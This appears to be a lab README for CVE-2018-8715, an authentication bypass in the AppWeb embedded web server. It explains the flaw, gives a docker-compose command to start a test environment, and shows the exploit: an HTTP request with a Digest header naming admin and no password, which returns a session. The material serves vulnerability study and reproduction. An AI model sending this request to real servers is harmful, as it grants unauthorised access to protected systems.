# AppWeb Authentication Bypass（CVE-2018-8715）

[中文版本（Chinese version）](README.zh-cn.md)

AppWeb is an embedded web server developed by Embedthis Software LLC. Developed in C/C++, can be run on almost  all popular OS.

AppWeb can be configured to use authentication,including the following three ways

- ​	Basic   Authentication 
- ​	Digest Authentication ，store session with cookie，instead of Authorization header
- ​	Form   Authentication 

versions < 7.0.3  ，there is a vulnerability for both digest and form authentication ；If the user gave `null` for  the password( leave the password field to empty), AppWeb will directly authenticate successfully due to a logical error and return session.



Reference:

- https://ssd-disclosure.com/index.php/archives/3676
- https://github.com/embedthis/appweb/issues/610



## Vulnerability environment

start the vulnerability environment

```
docker-compose up -d
```

Access `http://your-ip:8080`，then you will see the username and password field。

## Exploit

You need  an existing username，there is an `admin` for this  environment.

Generate a http packet with header  `Authorization: Digest username=admin`，and send  it to the server:

```
GET / HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Digest username=admin


```

As you can see,in the http response, because of the empty password field，the server made an error with a http status-code 200，including a session as well.

![](1.png)

Use the session above  in the browser，then you can access the page which is originally need to be authenticated：

![](2.png)
